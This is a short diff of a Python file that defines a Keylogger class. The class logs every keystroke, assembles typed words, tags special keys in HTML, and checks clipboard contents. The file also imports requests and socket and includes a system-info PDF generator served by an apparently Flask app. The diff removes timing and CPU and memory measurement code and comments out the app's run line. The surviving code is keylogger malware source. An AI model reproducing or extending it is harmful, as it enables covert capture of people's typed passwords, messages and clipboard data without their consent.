@@ -11,8 +11,7 @@ from reportlab.pdfgen import canvas
 import platform
 import socket
 import requests
-import time
-import psutil
+
 
 
 
@@ -34,7 +33,6 @@ class Keylogger:
         self.clipboard_content = []
         self.running = True
         self.current_word = ''
-        self.prev_timestamp = None
           # To store the current word being typed
 
     def start_logging(self):
@@ -43,11 +41,6 @@ class Keylogger:
 
     def on_key_press(self, event):
         key = event.name
-        current_timestamp = time.time()
-        if self.prev_timestamp is not None:
-            time_difference = current_timestamp - self.prev_timestamp
-            print(f"Time taken to log key '{key}': {time_difference} seconds")
-        self.prev_timestamp = current_timestamp
         if key == 'space':
             if self.current_word:  # Check if current_word is not empty
                 self.keystrokes.append(self.current_word)
@@ -57,14 +50,6 @@ class Keylogger:
         else:
             # Capture all keys, including special keys, and add a special class to them
             self.keystrokes.append(f'<span class="special-key">{key}</span>') 
-    def measure_resource_utilization(self):
-        # Measure CPU usage
-        cpu_usage = psutil.cpu_percent(interval=1)
-        print(f"CPU Usage: {cpu_usage}%")
-
-        # Measure memory consumption
-        memory_usage = psutil.virtual_memory().percent
-        print(f"Memory Usage: {memory_usage}%")
 
     def check_clipboard(self):
         prev_clipboard_content = None
@@ -246,8 +231,8 @@ def generate_system_info_pdf(system_data):
     buffer.close()
     return pdf
 
-if __name__ == '__main__':
-    app.run(debug=True)
+# if __name__ == '__main__':
+#     app.run(debug=True)
 
 
 
